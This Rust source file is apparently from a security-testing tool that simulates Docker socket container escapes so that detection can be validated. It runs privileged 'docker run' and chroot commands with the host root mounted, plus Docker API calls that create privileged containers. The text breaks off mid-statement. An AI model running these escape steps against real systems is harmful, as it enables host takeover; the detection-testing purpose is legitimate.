// SIGNALBENCH - Container Escape Techniques (T1611)
// Implements MITRE ATT&CK T1611: Escape to Host
//
// These techniques detect and simulate container escape vectors based on:
// - Unit42 research on container breakouts
// - deepce enumeration capabilities
// - MITRE ATT&CK framework specifications
//
// Developed by Simon Sigre (simon@gocortex.io)
// Part of the GoCortex.io platform for security testing and validation

use crate::config::TechniqueConfig;
use crate::techniques::{AttackTechnique, CleanupFuture, ExecuteFuture, SimulationResult, Technique, TechniqueParameter};
use async_trait::async_trait;
use log::{debug, info, warn};
use std::fs::{self, File};
use std::io::{BufRead, BufReader, Write};
use std::path::Path;
use tokio::process::Command;

// =============================================================================
// SHARED UTILITIES - Container Detection and Enumeration
// =============================================================================

/// Container runtime detection result
#[derive(Debug, Clone)]
pub struct ContainerEnvironment {
    pub is_container: bool,
    pub runtime: Option<String>,
    pub container_id: Option<String>,
    pub hostname: Option<String>,
}

/// Linux capability information
#[derive(Debug, Clone, Default)]
pub struct CapabilityInfo {
    pub cap_effective: u64,
    pub cap_permitted: u64,
    pub cap_inheritable: u64,
    pub cap_bounding: u64,
    pub cap_ambient: u64,
}

/// Known Linux capabilities with their bit positions
pub const CAP_SYS_ADMIN: u64 = 1 << 21;
pub const CAP_SYS_PTRACE: u64 = 1 << 19;
pub const CAP_SYS_MODULE: u64 = 1 << 16;
pub const CAP_NET_ADMIN: u64 = 1 << 12;
pub const CAP_DAC_OVERRIDE: u64 = 1 << 1;
pub const CAP_DAC_READ_SEARCH: u64 = 1 << 2;
pub const CAP_SYS_RAWIO: u64 = 1 << 17;
pub const CAP_MKNOD: u64 = 1 << 27;

/// Detects if running inside a container and identifies the runtime
/// The prefix parameter allows callers to specify their technique-specific logging prefix
pub fn detect_container_environment_with_prefix(prefix: &str) -> ContainerEnvironment {
    debug!("[{}] Starting container environment detection", prefix);
    
    let mut env = ContainerEnvironment {
        is_container: false,
        runtime: None,
        container_id: None,
        hostname: None,
    };
    
    // Check for /.dockerenv file (Docker-specific)
    if Path::new("/.dockerenv").exists() {
        debug!("[{}] Found /.dockerenv - Docker container detected", prefix);
        env.is_container = true;
        env.runtime = Some("docker".to_string());
    }
    
    // Check cgroup for container indicators
    if let Ok(cgroup_content) = fs::read_to_string("/proc/1/cgroup") {
        debug!("[{}] Analysing /proc/1/cgroup for container signatures", prefix);
        
        if cgroup_content.contains("/docker/") {
            debug!("[{}] Found /docker/ in cgroup - Docker detected", prefix);
            env.is_container = true;
            env.runtime = Some("docker".to_string());
            
            // Extract container ID from cgroup path
            for line in cgroup_content.lines() {
                if let Some(docker_pos) = line.find("/docker/") {
                    let id_start = docker_pos + 8;
                    if line.len() > id_start {
                        let container_id: String = line[id_start..].chars().take(12).collect();
                        if !container_id.is_empty() {
                            debug!("[{}] Extracted container ID: {}", prefix, container_id);
                            env.container_id = Some(container_id);
                        }
                    }
                    break;
                }
            }
        } else if cgroup_content.contains("/kubepods/") || cgroup_content.contains("/kubepods.slice/") {
            debug!("[{}] Found kubepods in cgroup - Kubernetes container detected", prefix);
            env.is_container = true;
            env.runtime = Some("kubernetes".to_string());
        } else if cgroup_content.contains("/lxc/") {
            debug!("[{}] Found /lxc/ in cgroup - LXC container detected", prefix);
            env.is_container = true;
            env.runtime = Some("lxc".to_string());
        } else if cgroup_content.contains("/containerd/") {
            debug!("[{}] Found /containerd/ in cgroup - containerd detected", prefix);
            env.is_container = true;
            env.runtime = Some("containerd".to_string());
        } else if cgroup_content.contains("/podman/") {
            debug!("[{}] Found /podman/ in cgroup - Podman detected", prefix);
            env.is_container = true;
            env.runtime = Some("podman".to_string());
        }
    }
    
    // Check for container-specific environment variables
    if std::env::var("KUBERNETES_SERVICE_HOST").is_ok() {
        debug!("[{}] Found KUBERNETES_SERVICE_HOST - Kubernetes environment", prefix);
        env.is_container = true;
        if env.runtime.is_none() {
            env.runtime = Some("kubernetes".to_string());
        }
    }
    
    // Get hostname
    if let Ok(hostname) = fs::read_to_string("/etc/hostname") {
        env.hostname = Some(hostname.trim().to_string());
        debug!("[{}] Hostname: {}", prefix, hostname.trim());
    }
    
    debug!("[{}] Detection complete - is_container: {}, runtime: {:?}", 
           prefix, env.is_container, env.runtime);
    
    env
}

/// Parses Linux capabilities from /proc/self/status
/// The prefix parameter allows callers to specify their technique-specific logging prefix
pub fn parse_capabilities_with_prefix(prefix: &str) -> CapabilityInfo {
    debug!("[{}] Parsing capabilities from /proc/self/status", prefix);
    
    let mut caps = CapabilityInfo::default();
    
    if let Ok(file) = File::open("/proc/self/status") {
        let reader = BufReader::new(file);
        
        for line in reader.lines().map_while(Result::ok) {
            if let Some((key, value)) = line.split_once(':') {
                let value = value.trim();
                match key {
                    "CapEff" => {
                        if let Ok(v) = u64::from_str_radix(value, 16) {
                            caps.cap_effective = v;
                            debug!("[{}] CapEff: 0x{:016x}", prefix, v);
                        }
                    }
                    "CapPrm" => {
                        if let Ok(v) = u64::from_str_radix(value, 16) {
                            caps.cap_permitted = v;
                            debug!("[{}] CapPrm: 0x{:016x}", prefix, v);
                        }
                    }
                    "CapInh" => {
                        if let Ok(v) = u64::from_str_radix(value, 16) {
                            caps.cap_inheritable = v;
                            debug!("[{}] CapInh: 0x{:016x}", prefix, v);
                        }
                    }
                    "CapBnd" => {
                        if let Ok(v) = u64::from_str_radix(value, 16) {
                            caps.cap_bounding = v;
                            debug!("[{}] CapBnd: 0x{:016x}", prefix, v);
                        }
                    }
                    "CapAmb" => {
                        if let Ok(v) = u64::from_str_radix(value, 16) {
                            caps.cap_ambient = v;
                            debug!("[{}] CapAmb: 0x{:016x}", prefix, v);
                        }
                    }
                    _ => {}
                }
            }
        }
    } else {
        debug!("[{}] Failed to open /proc/self/status", prefix);
    }
    
    caps
}

/// Checks if a specific capability is set in effective capabilities
pub fn has_capability(caps: &CapabilityInfo, cap_bit: u64) -> bool {
    (caps.cap_effective & cap_bit) != 0
}


/// Mount point information
#[derive(Debug, Clone)]
pub struct MountInfo {
    pub source: String,
    pub target: String,
    pub fstype: String,
    pub options: String,
}

/// Enumerates mount points from /proc/self/mounts
/// The prefix parameter allows callers to specify their technique-specific logging prefix
pub fn enumerate_mounts_with_prefix(prefix: &str) -> Vec<MountInfo> {
    debug!("[{}] Enumerating mount points from /proc/self/mounts", prefix);
    
    let mut mounts = Vec::new();
    
    if let Ok(content) = fs::read_to_string("/proc/self/mounts") {
        for line in content.lines() {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() >= 4 {
                let mount = MountInfo {
                    source: parts[0].to_string(),
                    target: parts[1].to_string(),
                    fstype: parts[2].to_string(),
                    options: parts[3].to_string(),
                };
                debug!("[{}] Found: {} -> {} ({})", prefix, mount.source, mount.target, mount.fstype);
                mounts.push(mount);
            }
        }
    }
    
    debug!("[{}] Enumerated {} mount points", prefix, mounts.len());
    mounts
}

/// Checks if a path appears to be a host mount (not container-internal)
pub fn is_sensitive_mount(mount: &MountInfo) -> bool {
    let sensitive_targets = [
        "/etc", "/var/run", "/var/log", "/root", "/home",
        "/proc/sys", "/sys", "/dev", "/",
    ];
    
    let sensitive_sources = [
        "/dev/sda", "/dev/xvda", "/dev/nvme", "/dev/vda",
        "overlay", "aufs",
    ];
    
    // Check if mounting sensitive host paths
    for target in &sensitive_targets {
        if mount.target == *target || mount.target.starts_with(&format!("{}/", target)) {
            return true;
        }
    }
    
    // Check for block device mounts
    for source in &sensitive_sources {
        if mount.source.starts_with(source) {
            return true;
        }
    }
    
    false
}

/// Checks for Docker socket access
/// The prefix parameter allows callers to specify their technique-specific logging prefix
pub fn check_docker_socket_with_prefix(prefix: &str) -> Option<String> {
    debug!("[{}] Checking for Docker socket access", prefix);
    
    let socket_paths = [
        "/var/run/docker.sock",
        "/run/docker.sock",
        "/var/run/podman/podman.sock",
        "/run/podman/podman.sock",
    ];
    
    for path in &socket_paths {
        if Path::new(path).exists() {
            debug!("[{}] Found container runtime socket: {}", prefix, path);
            return Some(path.to_string());
        }
    }
    
    debug!("[{}] No container runtime socket found", prefix);
    None
}

/// Gets the container's gateway IP (potential host IP)
/// The prefix parameter allows callers to specify their technique-specific logging prefix
pub fn get_gateway_ip_with_prefix(prefix: &str) -> Option<String> {
    debug!("[{}] Attempting to determine gateway IP", prefix);
    
    if let Ok(content) = fs::read_to_string("/proc/net/route") {
        for line in content.lines().skip(1) {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() >= 3 && parts[1] == "00000000" {
                // Gateway is in parts[2], hex-encoded in reverse byte order
                let hex_ip = parts[2];
                if hex_ip.len() == 8 {
                    if let Ok(ip_num) = u32::from_str_radix(hex_ip, 16) {
                        let ip = format!(
                            "{}.{}.{}.{}",
                            ip_num & 0xFF,
                            (ip_num >> 8) & 0xFF,
                            (ip_num >> 16) & 0xFF,
                            (ip_num >> 24) & 0xFF
                        );
                        debug!("[{}] Gateway IP: {}", prefix, ip);
                        return Some(ip);
                    }
                }
            }
        }
    }
    
    debug!("[{}] Could not determine gateway IP", prefix);
    None
}

// =============================================================================
// T1611-SOCK: Docker Socket Escape
// =============================================================================

pub struct DockerSocketEscape {}

#[async_trait]
impl AttackTechnique for DockerSocketEscape {
    fn info(&self) -> Technique {
        Technique {
            id: "T1611-SOCK".to_string(),
            name: "Docker Socket Escape".to_string(),
            description: "Container escape via exposed Docker socket. Executes docker CLI commands (docker ps, docker images, docker info, docker pull, docker run --privileged) and Docker API calls via curl and socat. When /var/run/docker.sock is mounted inside a container, an attacker can communicate with the Docker daemon to create privileged containers, mount the host filesystem, and execute commands on the host.".to_string(),
            category: "privilege_escalation".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "socket_path".to_string(),
                    description: "Path to Docker socket (default: /var/run/docker.sock)".to_string(),
                    required: false,
                    default: Some("/var/run/docker.sock".to_string()),
                },
                TechniqueParameter {
                    name: "output_dir".to_string(),
                    description: "Directory for enumeration output files".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_socket_escape".to_string()),
                },
                TechniqueParameter {
                    name: "attempt_pull".to_string(),
                    description: "Attempt to pull alpine image via docker pull".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
                TechniqueParameter {
                    name: "attempt_run".to_string(),
                    description: "Attempt privileged container run (will likely fail safely)".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
            ],
            detection: "Monitor for: docker CLI execution (docker ps, docker images, docker info, docker pull, docker run), process access to /var/run/docker.sock, curl/socat commands to unix sockets, container creation with --privileged flag, host mount attempts (-v /:/host), Docker API calls via unix socket.".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let socket_path = config
                .parameters
                .get("socket_path")
                .cloned()
                .unwrap_or_else(|| "/var/run/docker.sock".to_string());
            
            let output_dir = config
                .parameters
                .get("output_dir")
                .cloned()
                .unwrap_or_else(|| "/tmp/signalbench_socket_escape".to_string());
            
            debug!("[T1611-SOCK] Starting Docker Socket Escape technique");
            debug!("[T1611-SOCK] Socket path: {}", socket_path);
            debug!("[T1611-SOCK] Output directory: {}", output_dir);
            
            let mut artefacts = Vec::new();
            let mut findings = Vec::new();
            
            // Detect container environment
            let container_env = detect_container_environment_with_prefix("T1611-SOCK");
            debug!("[T1611-SOCK] Container detection: is_container={}, runtime={:?}",
                   container_env.is_container, container_env.runtime);
            
            let attempt_pull = config
                .parameters
                .get("attempt_pull")
                .map(|v| v.to_lowercase() == "true")
                .unwrap_or(true);
            
            let attempt_run = config
                .parameters
                .get("attempt_run")
                .map(|v| v.to_lowercase() == "true")
                .unwrap_or(true);
            
            if dry_run {
                info!("[DRY RUN] Would perform Docker Socket Escape:");
                info!("[DRY RUN] - Check for socket at: {}", socket_path);
                info!("[DRY RUN] - Execute: docker version");
                info!("[DRY RUN] - Execute: docker info");
                info!("[DRY RUN] - Execute: docker ps -a");
                info!("[DRY RUN] - Execute: docker images");
                info!("[DRY RUN] - Execute: docker network ls");
                if attempt_pull {
                    info!("[DRY RUN] - Execute: docker pull alpine:latest");
                }
                if attempt_run {
                    info!("[DRY RUN] - Execute: docker run --privileged --pid=host -v /:/host alpine id");
                }
                info!("[DRY RUN] - Execute: curl to Docker API endpoints");
                info!("[DRY RUN] - Execute: socat to Docker socket");
                info!("[DRY RUN] - Write findings to: {}", output_dir);
                
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: "DRY RUN: Would perform Docker socket escape".to_string(),
                    artifacts: vec![output_dir],
                    cleanup_required: false,
                });
            }
            
            // Create output directory
            debug!("[T1611-SOCK] Creating output directory: {}", output_dir);
            if let Err(e) = fs::create_dir_all(&output_dir) {
                warn!("[T1611-SOCK] Failed to create output directory: {}", e);
            } else {
                artefacts.push(output_dir.clone());
            }
            
            // Check for Docker socket
            let socket_exists = Path::new(&socket_path).exists();
            debug!("[T1611-SOCK] Socket exists at {}: {}", socket_path, socket_exists);
            
            // =========================================================
            // Execute docker CLI commands for telemetry
            // =========================================================
            
            // 1. docker version - Basic version check
            info!("[T1611-SOCK] Executing: docker version");
            let docker_version = Command::new("docker")
                .args(["version", "--format", "json"])
                .output()
                .await;
            
            match docker_version {
                Ok(output) => {
                    let stdout = String::from_utf8_lossy(&output.stdout);
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    if output.status.success() {
                        findings.push("[EXEC] docker version - SUCCESS".to_string());
                        debug!("[T1611-SOCK] docker version output: {}", stdout);
                        let version_file = format!("{}/docker_version_cli.json", output_dir);
                        if let Ok(mut f) = File::create(&version_file) {
                            let _ = f.write_all(output.stdout.as_slice());
                            artefacts.push(version_file);
                        }
                    } else {
                        findings.push(format!("[EXEC] docker version - FAILED: {}", stderr.trim()));
                    }
                }
                Err(e) => {
                    findings.push(format!("[EXEC] docker version - ERROR: {}", e));
                }
            }
            
            // 2. docker info - System-wide information
            info!("[T1611-SOCK] Executing: docker info");
            let docker_info = Command::new("docker")
                .args(["info", "--format", "json"])
                .output()
                .await;
            
            match docker_info {
                Ok(output) => {
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    if output.status.success() {
                        findings.push("[EXEC] docker info - SUCCESS (system info enumerated)".to_string());
                        let info_file = format!("{}/docker_info.json", output_dir);
                        if let Ok(mut f) = File::create(&info_file) {
                            let _ = f.write_all(output.stdout.as_slice());
                            artefacts.push(info_file);
                        }
                    } else {
                        findings.push(format!("[EXEC] docker info - FAILED: {}", stderr.trim()));
                    }
                }
                Err(e) => {
                    findings.push(format!("[EXEC] docker info - ERROR: {}", e));
                }
            }
            
            // 3. docker ps -a - List all containers
            info!("[T1611-SOCK] Executing: docker ps -a");
            let docker_ps = Command::new("docker")
                .args(["ps", "-a", "--format", "json"])
                .output()
                .await;
            
            match docker_ps {
                Ok(output) => {
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    if output.status.success() {
                        let container_count = String::from_utf8_lossy(&output.stdout).lines().count();
                        findings.push(format!("[EXEC] docker ps -a - SUCCESS ({} containers)", container_count));
                        let ps_file = format!("{}/docker_ps.json", output_dir);
                        if let Ok(mut f) = File::create(&ps_file) {
                            let _ = f.write_all(output.stdout.as_slice());
                            artefacts.push(ps_file);
                        }
                    } else {
                        findings.push(format!("[EXEC] docker ps -a - FAILED: {}", stderr.trim()));
                    }
                }
                Err(e) => {
                    findings.push(format!("[EXEC] docker ps -a - ERROR: {}", e));
                }
            }
            
            // 4. docker images - List all images
            info!("[T1611-SOCK] Executing: docker images");
            let docker_images = Command::new("docker")
                .args(["images", "--format", "json"])
                .output()
                .await;
            
            match docker_images {
                Ok(output) => {
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    if output.status.success() {
                        let image_count = String::from_utf8_lossy(&output.stdout).lines().count();
                        findings.push(format!("[EXEC] docker images - SUCCESS ({} images)", image_count));
                        let images_file = format!("{}/docker_images.json", output_dir);
                        if let Ok(mut f) = File::create(&images_file) {
                            let _ = f.write_all(output.stdout.as_slice());
                            artefacts.push(images_file);
                        }
                    } else {
                        findings.push(format!("[EXEC] docker images - FAILED: {}", stderr.trim()));
                    }
                }
                Err(e) => {
                    findings.push(format!("[EXEC] docker images - ERROR: {}", e));
                }
            }
            
            // 5. docker network ls - List networks
            info!("[T1611-SOCK] Executing: docker network ls");
            let docker_network = Command::new("docker")
                .args(["network", "ls", "--format", "json"])
                .output()
                .await;
            
            match docker_network {
                Ok(output) => {
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    if output.status.success() {
                        findings.push("[EXEC] docker network ls - SUCCESS".to_string());
                        let network_file = format!("{}/docker_networks.json", output_dir);
                        if let Ok(mut f) = File::create(&network_file) {
                            let _ = f.write_all(output.stdout.as_slice());
                            artefacts.push(network_file);
                        }
                    } else {
                        findings.push(format!("[EXEC] docker network ls - FAILED: {}", stderr.trim()));
                    }
                }
                Err(e) => {
                    findings.push(format!("[EXEC] docker network ls - ERROR: {}", e));
                }
            }
            
            // 6. docker pull alpine:latest - Attempt to pull image
            if attempt_pull {
                info!("[T1611-SOCK] Executing: docker pull alpine:latest");
                let docker_pull = Command::new("docker")
                    .args(["pull", "alpine:latest"])
                    .output()
                    .await;
                
                match docker_pull {
                    Ok(output) => {
                        let stderr = String::from_utf8_lossy(&output.stderr);
                        if output.status.success() {
                            findings.push("[EXEC] docker pull alpine:latest - SUCCESS (image pulled)".to_string());
                        } else {
                            findings.push(format!("[EXEC] docker pull alpine:latest - FAILED: {}", stderr.trim()));
                        }
                    }
                    Err(e) => {
                        findings.push(format!("[EXEC] docker pull alpine:latest - ERROR: {}", e));
                    }
                }
            }
            
            // 7. Attempt privileged container run with host mounts
            // This is an intrusive test that creates a marker file on the host
            let host_marker_path: &str = "/tmp/signalbench_escape_marker";
            let mut host_marker_created = false;
            
            if attempt_run {
                // First, create a marker file on the host to prove escape capability
                info!("[T1611-SOCK] Executing: docker run --privileged -v /:/host alpine touch /host{}", host_marker_path);
                let docker_marker = Command::new("docker")
                    .args([
                        "run", "--rm",
                        "--privileged",
                        "--pid=host",
                        "--net=host",
                        "-v", "/:/host",
                        "alpine:latest",
                        "sh", "-c",
                        &format!(
                            "touch /host{} && echo 'SignalBench T1611-SOCK escape marker - created at '$(date) > /host{} && id",
                            host_marker_path, host_marker_path
                        )
                    ])
                    .output()
                    .await;
                
                match docker_marker {
                    Ok(output) => {
                        let stdout = String::from_utf8_lossy(&output.stdout);
                        let stderr = String::from_utf8_lossy(&output.stderr);
                        if output.status.success() {
                            findings.push(format!("[CRITICAL] docker run --privileged - SUCCESS: {}", stdout.trim()));
                            findings.push(format!("[ESCAPE] Host marker file created: {}", host_marker_path));
                            findings.push("[ESCAPE] Container escape to host filesystem CONFIRMED!".to_string());
                            host_marker_created = true;
                            // Track the host marker file for cleanup
                            artefacts.push(host_marker_path.to_string());
                        } else {
                            findings.push(format!("[EXEC] docker run --privileged - BLOCKED: {}", stderr.trim()));
                        }
                    }
                    Err(e) => {
                        findings.push(format!("[EXEC] docker run --privileged - ERROR: {}", e));
                    }
                }
                
                // Also try with chroot to host filesystem for additional telemetry
                info!("[T1611-SOCK] Executing: docker run with chroot /host");
                let docker_chroot = Command::new("docker")
                    .args([
                        "run", "--rm",
                        "--privileged",
                        "-v", "/:/host",
                        "alpine:latest",
                        "chroot", "/host", "cat", "/etc/hostname"
                    ])
                    .output()
                    .await;
                
                match docker_chroot {
                    Ok(output) => {
                        let stdout = String::from_utf8_lossy(&output.stdout);
                        let stderr = String::from_utf8_lossy(&output.stderr);
                        if output.status.success() {
                            findings.push(format!("[CRITICAL] chroot /host - SUCCESS: hostname={}", stdout.trim()));
                        } else {
                            findings.push(format!("[EXEC] chroot /host - BLOCKED: {}", stderr.trim()));
                        }
                    }
                    Err(e) => {
                        findings.push(format!("[EXEC] chroot /host - ERROR: {}", e));
                    }
                }
                
                // Verify marker file exists by reading it via another container
                if host_marker_created {
                    info!("[T1611-SOCK] Verifying host marker file via docker run cat");
                    let verify_marker = Command::new("docker")
                        .args([
                            "run", "--rm",
                            "-v", "/:/host:ro",
                            "alpine:latest",
                            "cat", &format!("/host{}", host_marker_path)
                        ])
                        .output()
                        .await;
                    
                    if let Ok(output) = verify_marker {
                        if output.status.success() {
                            let content = String::from_utf8_lossy(&output.stdout);
                            findings.push(format!("[VERIFIED] Host marker content: {}", content.trim()));
                            debug!("[T1611-SOCK] Marker file verified on host");
                        }
                    }
                }
            }
            
            // 8. docker inspect self - Container introspection
            info!("[T1611-SOCK] Executing: docker inspect on running containers");
            let docker_inspect = Command::new("docker")
                .args(["ps", "-q"])
                .output()
                .await;
            
            if let Ok(output) = docker_inspect {
                if output.status.success() {
                    let container_ids = String::from_utf8_lossy(&output.stdout);
                    if let Some(first_id) = container_ids.lines().next() {
                        let inspect_result = Command::new("docker")
                            .args(["inspect", first_id])
                            .output()
                            .await;
                        
                        if let Ok(inspect_output) = inspect_result {
                            if inspect_output.status.success() {
                                findings.push(format!("[EXEC] docker inspect {} - SUCCESS", first_id));
                                let inspect_file = format!("{}/docker_inspect.json", output_dir);
                                if let Ok(mut f) = File::create(&inspect_file) {
                                    let _ = f.write_all(inspect_output.stdout.as_slice());
                                    artefacts.push(inspect_file);
                                }
                            }
                        }
                    }
                }
            }
            
            // =========================================================
            // Docker API access via curl (if socket exists OR force mode)
            // Force mode: attempt operations regardless of pre-checks
            // Security products detect the ATTEMPT, not just success
            // =========================================================
            
            let force_mode = config.force;
            if socket_exists || force_mode {
                if force_mode && !socket_exists {
                    findings.push("[FORCE] Attempting Docker API calls despite socket not found".to_string());
                    info!("[T1611-SOCK] [FORCE] Force mode - attempting API calls without socket");
                } else {
                    findings.push(format!("[CRITICAL] Docker socket accessible at: {}", socket_path));
                }
                info!("[T1611-SOCK] [CRITICAL] Docker socket found - executing API calls");
                
                // curl to Docker API version endpoint
                debug!("[T1611-SOCK] Executing: curl --unix-socket to /version");
                let version_output = Command::new("curl")
                    .args(["--unix-socket", &socket_path, "http://localhost/version", "-s", "-m", "5"])
                    .output()
                    .await;
                
                if let Ok(output) = version_output {
                    if output.status.success() {
                        findings.push("[API] curl /version - SUCCESS".to_string());
                        let version_file = format!("{}/api_version.json", output_dir);
                        if let Ok(mut f) = File::create(&version_file) {
                            let _ = f.write_all(output.stdout.as_slice());
                            artefacts.push(version_file);
                        }
                    }
                }
                
                // curl to list containers via API
                debug!("[T1611-SOCK] Executing: curl --unix-socket to /containers/json");
                let containers_output = Command::new("curl")
                    .args(["--unix-socket", &socket_path, "http://localhost/containers/json?all=true", "-s", "-m", "5"])
                    .output()
                    .await;
                
                if let Ok(output) = containers_output {
                    if output.status.success() {
                        findings.push("[API] curl /containers/json - SUCCESS".to_string());
                        let containers_file = format!("{}/api_containers.json", output_dir);
                        if let Ok(mut f) = File::create(&containers_file) {
                            let _ = f.write_all(output.stdout.as_slice());
                            artefacts.push(containers_file);
                        }
                    }
                }
                
                // curl to list images via API
                debug!("[T1611-SOCK] Executing: curl --unix-socket to /images/json");
                let images_output = Command::new("curl")
                    .args(["--unix-socket", &socket_path, "http://localhost/images/json", "-s", "-m", "5"])
                    .output()
                    .await;
                
                if let Ok(output) = images_output {
                    if output.status.success() {
                        findings.push("[API] curl /images/json - SUCCESS".to_string());
                        let images_file = format!("{}/api_images.json", output_dir);
                        if let Ok(mut f) = File::create(&images_file) {
                            let _ = f.write_all(output.stdout.as_slice());
                            artefacts.push(images_file);
                        }
                    }
                }
                
                // curl to get system info via API
                debug!("[T1611-SOCK] Executing: curl --unix-socket to /info");
                let info_output = Command::new("curl")
                    .args(["--unix-socket", &socket_path, "http://localhost/info", "-s", "-m", "5"])
                    .output()
                    .await;
                
                if let Ok(output) = info_output {
                    if output.status.success() {
                        findings.push("[API] curl /info - SUCCESS (system info exposed)".to_string());
                        let info_file = format!("{}/api_info.json", output_dir);
                        if let Ok(mut f) = File::create(&info_file) {
                            let _ = f.write_all(output.stdout.as_slice());
                            artefacts.push(info_file);
                        }
                    }
                }
                
                // =========================================================
                // Unit42 Docker API attack sequence: /containers/create and /containers/{id}/start
                // These are the specific API calls that Cortex XDR detects
                // =========================================================
                
                // POST /containers/create - Create a privileged container via API
                // This is the critical detection trigger from Unit42 research
                let container_config = r#"{"Image":"alpine:latest","Cmd":["/bin/sh","-c","echo SignalBench API escape test && id"],"HostConfig":{"Privileged":true,"Binds":["/:/host"],"PidMode":"host","NetworkMode":"host"}}"#;
                
                info!("[T1611-SOCK] Executing: curl POST /containers/create (Unit42 attack pattern)");
                debug!("[T1611-SOCK] Container config: {}", container_config);
                
                let create_output = Command::new("curl")
                    .args([
                        "--unix-socket", &socket_path,
                        "-X", "POST",
                        "-H", "Content-Type: application/json",
                        "-d", container_config,
                        "http://localhost/containers/create?name=signalbench_api_test",
                        "-s", "-m", "10"
                    ])
                    .output()
                    .await;
                
                let mut created_container_id: Option<String> = None;
                match create_output {
                    Ok(output) => {
                        let stdout = String::from_utf8_lossy(&output.stdout);
                        let stderr = String::from_utf8_lossy(&output.stderr);
                        debug!("[T1611-SOCK] /containers/create response: {}", stdout);
                        
                        if output.status.success() && stdout.contains("Id") {
                            findings.push("[API] curl POST /containers/create - SUCCESS (privileged container created!)".to_string());
                            findings.push("[CRITICAL] Docker API container creation - XDR detection trigger".to_string());
                            info!("[T1611-SOCK] [CRITICAL] Container created via Docker API");
                            
                            // Extract container ID from response {"Id":"...","Warnings":[]}
                            if let Some(id_start) = stdout.find("\"Id\":\"") {
                                let id_slice = &stdout[id_start + 6..];
                                if let Some(id_end) = id_slice.find('\"') {
                                    let container_id = &id_slice[..id_end];
                                    created_container_id = Some(container_id.to_string());
                                    findings.push(format!("[API] Created container ID: {}", &container_id[..12.min(container_id.len())]));
                                    debug!("[T1611-SOCK] Extracted container ID: {}", container_id);
                                }
                            }
                            
                            // Save create response
                            let create_file = format!("{}/api_containers_create.json", output_dir);
                            if let Ok(mut f) = File::create(&create_file) {
                                let _ = f.write_all(output.stdout.as_slice());
                                artefacts.push(create_file);
                            }
                        } else if stdout.contains("Conflict") || stdout.contains("already in use") {
                            findings.push("[API] curl POST /containers/create - container name conflict (API accessible)".to_string());
                            debug!("[T1611-SOCK] Container name conflict: {}", stdout);
                        } else {
                            findings.push(format!("[API] curl POST /containers/create - FAILED: {}", 
                                if !stderr.is_empty() { stderr.trim() } else { stdout.trim() }));
                        }
                    }
                    Err(e) => {
                        findings.push(format!("[API] curl POST /containers/create - ERROR: {}", e));
                    }
                }
                
                // POST /containers/{id}/start - Start the created container
                // This is another critical detection trigger from Unit42 research
                if let Some(ref container_id) = created_container_id {
                    info!("[T1611-SOCK] Executing: curl POST /containers/{}/start (Unit42 attack pattern)", &container_id[..12.min(container_id.len())]);
                    
                    let start_output = Command::new("curl")
                        .args([
                            "--unix-socket", &socket_path,
                            "-X", "POST",
                            &format!("http://localhost/containers/{}/start", container_id),
                            "-s", "-m", "10"
                        ])
                        .output()
                        .await;
                    
                    match start_output {
                        Ok(output) => {
                            // 204 No Content is success for /start
                            if output.status.success() {
                                findings.push("[API] curl POST /containers/{id}/start - SUCCESS (container started!)".to_string());
                                findings.push("[CRITICAL] Docker API container start - XDR detection trigger".to_string());
                                info!("[T1611-SOCK] [CRITICAL] Container started via Docker API");
                            } else {
                                let stderr = String::from_utf8_lossy(&output.stderr);
                                let stdout = String::from_utf8_lossy(&output.stdout);
                                findings.push(format!("[API] curl POST /containers/{{id}}/start - FAILED: {}", 
                                    if !stderr.is_empty() { stderr.trim() } else { stdout.trim() }));
                            }
                        }
                        Err(e) => {
                            findings.push(format!("[API] curl POST /containers/{{id}}/start - ERROR: {}", e));
                        }
                    }
                    
                    // Wait briefly for container to execute
                    tokio::time::sleep(std::time::Duration::from_millis(500)).await;
                    
                    // GET /containers/{id}/logs - Get container output
                    info!("[T1611-SOCK] Executing: curl GET /containers/{}/logs", &container_id[..12.min(container_id.len())]);
                    let logs_output = Command::new("curl")
                        .args([
                            "--unix-socket", &socket_path,
                            &format!("http://localhost/containers/{}/logs?stdout=true&stderr=true", container_id),
                            "-s", "-m", "5"
                        ])
                        .output()
                        .await;
                    
                    if let Ok(output) = logs_output {
                        if output.status.success() {
                            let logs = String::from_utf8_lossy(&output.stdout);
                            if !logs.is_empty() {
                                findings.push(format!("[API] Container logs retrieved: {} bytes", logs.len()));
                                debug!("[T1611-SOCK] Container logs: {}", logs);
                            }
                        }
                    }
                    
                    // DELETE /containers/{id} - Clean up the created container
                    info!("[T1611-SOCK] Executing: curl DELETE /containers/{} (cleanup)", &container_id[..12.min(container_id.len())]);
                    
                    // First stop the container
                    let _ = Command::new("curl")
                        .args([
                            "--unix-socket", &socket_path,
                            "-X", "POST",
                            &format!("http://localhost/containers/{}/stop?t=1", container_id),
                            "-s", "-m", "5"
                        ])
                        .output()
                        .await;
                    
                    // Then remove it
                    let delete_output = Command::new("curl")
                        .args([
                            "--unix-socket", &socket_path,
                            "-X", "DELETE",
                            &format!("http://localhost/containers/{}?force=true", container_id),
                            "-s", "-m", "5"
                        ])
                        .output()
                        .await;
                    
                    if let Ok(output) = delete_output {
                        if output.status.success() {
                            findings.push("[API] Container cleanup successful".to_string());
                            debug!("[T1611-SOCK] Cleaned up API-created container");
                        }
                    }
                }
                
                // Also try to remove any leftover container by name
                let _ = Command::new("curl")
                    .args([
                        "--unix-socket", &socket_path,
                        "-X", "DELETE",
                        "http://localhost/containers/signalbench_api_test?force=true",
                        "-s", "-m", "5"
                    ])
                    .output()
                    .await;
                
                // socat to Docker socket (alternative access method)
                debug!("[T1611-SOCK] Executing: socat to Docker socket");
                let socat_output = Command::new("bash")
                    .args(["-c", &format!(
